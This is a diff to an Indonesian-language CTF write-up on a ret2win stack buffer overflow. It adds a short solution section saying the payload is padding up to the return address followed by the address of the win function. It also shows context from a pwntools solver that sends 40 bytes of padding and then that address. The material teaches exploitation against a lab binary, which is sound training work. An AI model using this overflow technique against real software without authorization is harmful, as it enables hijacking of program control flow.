@@ -33,6 +33,10 @@ caranya sudah banyak di internet kalau masih kurang paham.
 
 ![Preview](images/4.png)
 
+## Penyelesaian
+kalau sudah dapat offset ke return address nya sekarang buat paylaod nya seperti ini
+payload = offset + return win
+
 sekarang kita buat solvernya 
 **solver**
 ```
@@ -47,3 +51,6 @@ payload = flat(b'a'*40,elf.sym.win)
 p.sendline(payload)
 p.interactive()
 ```
+
+
+
